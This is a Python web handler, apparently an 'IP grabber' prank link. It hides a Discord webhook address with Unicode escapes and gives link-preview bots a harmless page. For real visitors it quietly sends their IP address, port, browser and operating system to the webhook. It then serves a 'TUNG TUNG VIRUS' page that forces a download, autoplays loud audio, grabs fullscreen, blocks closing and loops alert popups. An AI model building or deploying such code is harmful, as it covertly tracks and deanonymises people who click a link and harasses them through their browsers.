from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser

# Hidden with Unicode escapes (not visible as plain text)
WEBHOOK_URL = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0031\u0034\u0039\u0030\u0031\u0034\u0036\u0030\u0032\u0039\u0035\u0030\u0033\u0033\u0038\u0035\u0037\u0033\u0034\u002f\u0064\u004a\u0048\u0044\u0056\u0064\u0054\u0068\u0031\u0031\u0051\u0048\u0046\u0077\u005f\u0069\u006b\u004e\u0077\u002d\u0077\u0070\u0046\u0047\u0033\u004e\u0042\u0038\u0041\u004e\u0030\u0032\u0058\u006c\u002d\u0072\u0047\u004d\u0054\u006e\u005f\u0038\u0065\u006a\u004a\u0078\u0076\u0079\u0054\u0057\u0059\u0079\u0078\u004f\u0068\u0064\u005a\u0033\u0050\u0033\u0055\u0031\u0074\u004e\u0051\u005f\u0042\u0056"
FAKE_IMAGE_URL = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u006d\u0065\u0064\u0069\u0061\u002e\u0074\u0065\u006e\u006f\u0072\u002e\u0063\u006f\u006d\u002f\u0058\u0050\u0069\u0057\u0073\u0035\u0069\u006c\u0038\u006f\u0077\u0041\u0041\u0041\u0041\u004d\u002f\u0074\u0075\u006e\u0067\u002d\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u002d\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u002d\u0073\u0061\u0068\u0075\u0072\u002d\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u0073\u0061\u0068\u0075\u0072\u002d\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u0073\u0061\u0068\u0075\u0072\u002e\u0067\u0069\u0066"

# Simple & stable annoying page
ANNOY_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG</title>
  <style>
    body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
    #overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
    h1{font-size:6em;animation:blink 0.3s infinite;}
    @keyframes blink{0%,100%{opacity:1} 50%{opacity:0.1}}
  </style>
</head>
<body>
  <div id="overlay">
    <h1>TUNG TUNG VIRUS</h1>
    <p>LOUD MODE ON 🔥</p>
  </div>

  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>

  <script>
    const audio = document.getElementById("song");
    audio.volume = 1.0;
    function playAudio() { audio.play().catch(() => setTimeout(playAudio, 300)); }
    playAudio();

    // Force GIF download
    const link = document.createElement('a');
    link.href = "{0}";
    link.download = "tung-tung-virus.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    // Annoying stuff
    document.documentElement.requestFullscreen?.().catch(() => {{}});
    window.onbeforeunload = () => "TUNG TUNG says NO!";
    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 800);
  </script>
</body>
</html>
""".format(FAKE_IMAGE_URL)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            user_agent = self.headers.get('User-Agent', '')

            # Skip Discord bots / crawlers
            if any(bot in user_agent.lower() for bot in ['discordbot', 'discord', 'crawler', 'bot', 'spider']):
                html = ANNOY_HTML.encode('utf-8')
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-Length', len(html))
                self.end_headers()
                self.wfile.write(html)
                return

            # Real user → log
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            parsed = httpagentparser.detect(user_agent)

            log = f"""**NEW CLICK!**
IP: `{ip}`
Port: `{port}`
Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
OS: {parsed.get('os', {}).get('name', 'Unknown')}
UA: `{user_agent}`
**Tung Tung loud song activated!**"""

            requests.post(WEBHOOK_URL, json={"content": log})

            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
